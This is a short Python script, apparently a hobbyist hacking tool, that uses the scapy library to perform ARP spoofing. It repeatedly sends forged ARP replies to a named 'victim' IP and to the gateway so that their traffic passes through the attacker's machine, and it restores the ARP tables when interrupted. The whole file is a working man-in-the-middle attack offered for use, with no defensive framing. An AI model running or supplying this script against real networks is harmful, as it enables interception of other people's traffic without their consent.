
import scapy.all as scapy
import sys
import time
import optparse;

def get_mac(ipaddress):
    arp_request = scapy.ARP()
    arp_request.pdst = ipaddress
    boradcast = scapy.Ether()
    boradcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = boradcast/arp_request
    answered,unanswered = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)
    mac_address = answered[0][1].hwsrc
    return mac_address
def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose =False)
#"00:0C:29:98:68:AE"
def spoof(target_ip,gateway_ip):
    mac_address = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=mac_address,psrc=gateway_ip)
    scapy.send(packet,verbose=False)
sended = 0;

try:
 parser = optparse.OptionParser()
 parser.add_option("-t","--target",dest="target_ip",help="Victim IP address")
 parser.add_option("-g","--gateway",dest="gateway_ip",help="Router or Gateway Ip address");
 (options,arguments) = parser.parse_args()
 targetIp =  options.target_ip
 gatewayIp = options.gateway_ip
 if options.target_ip and options.gateway_ip:
     while True:
        spoof(targetIp, gatewayIp)
        spoof(gatewayIp, targetIp)
        sended = sended + 2
        print("\r[+] No of packet send successfully  "+str(sended),end=" ")
        time.sleep(2)
 else:
        print("[+] Please Add arguments or check --help")
except KeyboardInterrupt:
        print("\n")
        print("[+] Control+C detected");
        print("[+] Closing and resetting the ARP table");
        restore(targetIp, gatewayIp)
        restore(gatewayIp, targetIp)